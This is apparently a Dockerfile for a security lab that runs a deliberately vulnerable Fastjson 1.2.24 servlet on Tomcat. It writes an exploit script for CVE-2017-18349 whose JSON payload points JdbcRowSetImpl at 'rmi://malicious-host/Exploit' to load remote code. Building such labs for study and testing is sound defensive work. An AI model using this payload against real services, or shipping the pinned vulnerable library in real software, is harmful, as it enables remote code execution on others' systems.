FROM tomcat:9.0-jdk8-openjdk-slim
LABEL maintainer="security@example.com"

# Install utilities needed for the demonstration
RUN apt-get update && apt-get install -y curl && rm -rf /var/lib/apt/lists/*

# Download a vulnerable version of Fastjson (1.2.24)
RUN curl -L -o /usr/local/tomcat/lib/fastjson-1.2.24.jar https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.24/fastjson-1.2.24.jar

# Add Java source that uses Fastjson
RUN mkdir -p /usr/local/tomcat/webapps/ROOT/WEB-INF/classes/com/example
COPY ExploitDemo.java /usr/local/tomcat/webapps/ROOT/WEB-INF/classes/com/example/ExploitDemo.java

# Compile the Java source against Tomcat's servlet API and Fastjson
RUN javac -classpath /usr/local/tomcat/lib/servlet-api.jar:/usr/local/tomcat/lib/fastjson-1.2.24.jar \
    /usr/local/tomcat/webapps/ROOT/WEB-INF/classes/com/example/ExploitDemo.java && \
    rm /usr/local/tomcat/webapps/ROOT/WEB-INF/classes/com/example/ExploitDemo.java

# Add a minimal web.xml to map the servlet
COPY web.xml /usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml

# Add an exploit script for testing purposes only (not executed by default)
RUN printf '#!/bin/sh\necho "Attempting to trigger CVE-2017-18349..."\ncurl -X POST -d "{\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"rmi://malicious-host/Exploit\\\",\\\"autoCommit\\\":true}" http://localhost:8080/trigger\n' > /exploit.sh && chmod +x /exploit.sh

EXPOSE 8080
